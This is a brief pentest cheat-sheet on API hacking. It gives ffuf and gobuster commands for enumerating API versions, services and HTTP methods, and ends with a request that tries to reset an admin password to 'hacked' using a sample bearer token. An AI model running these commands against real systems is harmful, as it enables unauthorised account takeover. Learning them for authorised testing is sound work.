# API Hacking

## Recon

### identify endpoints

* look for version conventions like `/some_service/v1` or v2 or v3 etc.
* Prepare pattern for ffuf to identify api endpoints

```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ip/FUZZ/v1/ -mc 200

```

Or use `gobuster`

`gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern`

where pattern is like 

```txt
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/v3
```

### identify services

Once `endpoint` identifued, look for services


```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ip/endpoint_name/v1/FUZZ -mc 200

```

the look for subservices once service_A identified


```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ip/endpoint_name/v1/service_A/subservice_A1 -mc 200

```

### identify Methods


```bash

ffuf -w test_methods.txt -u https://ip/endpoint_name/v1/user/change_password -X FUZZ -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4" \
-d '{"name": "admin", "password": "hacked"}' -fr "error"

# where FUZZ is replaced by POST, PUT, GET methods by using a regular token obtained throughout the session

```

* No error mean that this particular method worked
* particularly here admin password might have been changed